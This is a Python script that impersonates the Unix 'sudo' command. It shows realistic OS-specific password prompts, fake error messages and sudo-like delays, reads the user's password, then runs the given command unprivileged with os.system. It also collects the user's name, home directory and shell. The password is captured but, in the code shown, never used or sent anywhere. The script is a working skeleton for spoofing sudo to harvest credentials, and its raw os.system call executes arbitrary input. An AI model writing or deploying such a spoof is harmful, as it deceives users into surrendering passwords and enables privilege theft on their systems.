import sys, os, platform, time
import argparse, pwd, getpass

parser = argparse.ArgumentParser(add_help=False, epilog=("{}".format(os.system("sudo -h"))))
parser.add_argument("command")
args = parser.parse_args()
command = str(args.command)

class vars():
    def __init__(self, uid):
        self.uid = uid

    sudo_username = "root" # set the user to assume sudo under
    uid = int(os.getuid()) 
    u_name = str(pwd.getpwuid(uid)[0]) # get current username
    u_pwd = str(pwd.getpwuid(uid)[1]) # get current user password
    u_home = str(pwd.getpwuid(uid)[5]) # get current users home directory
    u_shell = str(pwd.getpwuid(uid)[6]) # get current users shell choice

def systemCheck(): # check what OS this is being ran on
    host_os = platform.system() # gets the current operating system type
    if host_os == "Windows": # assume this is Windows
        print("""'sudo' is not recognized as an internal or external command, operable program or batch file.""")
        sys.exit() # sudo obviously won't run on windows, so lets error
    if host_os == "Linux": # assume this is a normal linux kernel
        return "Linux"
    if host_os == "Darwin": # assume this is macOS
        return "MacOS"
    if "BSD" in host_os: # assume this is a BSD distribution
        return "BSD"

def sudoPassword(): # return the password prompt
    host_os = platform.system() # what type of password prompt do we want
    if host_os == "Darwin":
        password = getpass.getpass(prompt="Password: ")
        return str(password)
    if host_os == "Linux":
        password = getpass.getpass(prompt="[sudo] password for {}: ".format(vars.u_name))
        return str(password)
    if "BSD" in host_os:
        password = getpass.getpass(prompt="Password: ")
        return str(password)

try:
    #print("{} {} {} {}".format(vars.uid, vars.u_name, vars.u_home, vars.u_shell))
    systemCheck()
    password = sudoPassword() # ask for the sudo password
    if password == "":
        time.sleep(1)
        print("sudo: incorrect password")
        sys.exit()
    else:
        time.sleep(1)
        os.system(command) # run the command and return the output  
except:
    sys.exit() # exit the program
